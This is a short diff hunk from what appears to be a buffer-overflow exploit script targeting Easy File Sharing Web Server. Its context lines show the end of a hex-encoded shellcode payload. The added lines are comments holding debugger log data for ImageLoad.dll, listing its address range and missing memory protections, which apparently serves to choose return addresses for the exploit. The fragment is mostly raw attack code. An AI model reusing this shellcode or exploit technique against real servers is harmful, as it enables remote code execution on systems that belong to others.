@@ -46,6 +46,10 @@ shellcode += "\x9d\x01\x36\xd3\x5d\xf6\x26\x96\x58\xb2\xe0\x4a"
 shellcode += "\x10\xab\x84\x6c\x87\xcc\x8c\x0e\x46\x5f\x4c\xff"
 shellcode += "\xed\xe7\xf7\xff"
 
+# Log data, item 69
+# Address=0BADF00D
+# Message= 0x10000000 | 0x10050000 | 0x00050000 | False  | False   | False |  False   | False  | -1.0- [ImageLoad.dll] (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
+
 
 # Log data, item 24
 # Address=100195F2
